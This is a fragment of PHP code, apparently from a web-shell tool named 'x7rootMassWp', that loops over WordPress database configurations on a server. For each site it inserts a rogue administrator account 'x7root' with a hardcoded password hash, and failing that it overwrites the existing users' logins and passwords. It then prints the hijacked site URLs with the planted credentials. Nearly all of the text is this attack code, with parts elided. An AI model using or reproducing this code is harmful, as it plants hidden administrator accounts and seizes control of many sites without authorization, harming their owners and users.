            ...
            $_path = getcwd() . "/x7rootMassWp/";
                ...
                foreach ($config[1] as $don) {
                    ...
                    ReadmeName " . $don);
                        ...
                        if ($connect) {
                            $qr1=mysqli_query($connect,"INSERT INTO `".$prefix."users` (`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`) VALUES ('x7root', '21232f297a57a5a743894a0e4a801fc3', 'firstname lastname', 'email@example.com', '0');");
                            ...
                            if ($qr1 && $qr2 && $qr3 && $qr4) {
                                ...
                                echo "$siteeurl|x7root|x7root@12<br>";
                            } else {
                                ...
                                $siteeurl = str_replace("//wp", "/wp", $siteeurl);
                                $query2 = mysqli_query($connect,"update ".$prefix."users set user_login='Admin',user_pass='b29fd0ad419c991adf7363a385d9003a'");
                                if($query2){
                                    $_total_done++;
                                    echo "$siteeurl|x7root|admin<br>";
                                }
                            }
                        }
                    }
